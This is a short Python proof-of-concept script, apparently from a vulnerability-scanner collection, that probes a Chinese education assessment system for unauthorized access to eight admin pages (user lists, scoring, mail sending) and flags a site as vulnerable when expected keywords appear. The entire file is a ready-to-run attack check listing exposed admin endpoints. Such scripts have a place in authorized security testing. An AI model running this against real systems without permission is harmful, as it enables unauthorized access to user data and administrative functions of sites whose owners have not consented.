#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 学子科技诊断测评系统多处未授权访问
referer: http://www.wooyun.org/bugs/wooyun-2010-0138025
author: Lucifer
description: 多处未授权访问。
'''
import sys
import requests



class xuezi_ceping_unauth_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        vulnurls = [
            self.url + '/ceping/HouAdmin/GLGWUsers.aspx',
            self.url + '/ceping/HouAdmin/GLComUser.aspx',
            self.url + '/ceping/HouAdmin/GLComleibie2.aspx',
            self.url + '/ceping/HouAdmin/GL_Shitileibie.aspx',
            self.url + '/ceping/HouAdmin/GL_PingFen.aspx',
            self.url + '/ceping/HouAdmin/GL_FenXiFuDao.aspx',
            self.url + '/ceping/HouAdmin/MailSection.aspx',
            self.url + '/ceping/HouAdmin/sendmails.aspx'
        ]
        verifys = [
            '注册时间',
            '注册时间',
            '类别名称',
            '添加试题类别',
            '请选择类别',
            '分析报告',
            '发件地址',
            '邮件内容'
        ]
        for i in range(len(vulnurls)):
            vulnurl = vulnurls[i]
            verify = verifys[i]
            try:
                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                if verify in req.text:
                    return "[+]存在学子科技诊断测评系统未授权访问漏洞...(高危)\tpayload: "+vulnurl

            except:
                return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = xuezi_ceping_unauth_BaseVerify(sys.argv[1])
    testVuln.run()